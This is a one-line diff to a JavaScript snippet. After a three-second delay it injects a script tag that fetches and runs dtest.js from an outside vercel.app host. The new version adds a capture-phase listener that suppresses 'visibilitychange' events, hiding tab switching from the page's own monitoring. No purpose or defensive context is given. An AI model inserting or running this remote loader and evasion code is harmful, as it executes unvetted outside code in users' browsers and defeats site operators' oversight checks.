@@ -1,1 +1,1 @@
-setTimeout(function(){var script=document.createElement("script");script.src="https://abc-two-dusky.vercel.app/dtest.js?v="+Date.now();document.body.appendChild(script)},3000);
+setTimeout(function(){var script=document.createElement("script");script.src="https://abc-two-dusky.vercel.app/dtest.js?v="+Date.now();document.body.appendChild(script);document.addEventListener("visibilitychange",function(event){event.stopImmediatePropagation()},true)},3000);
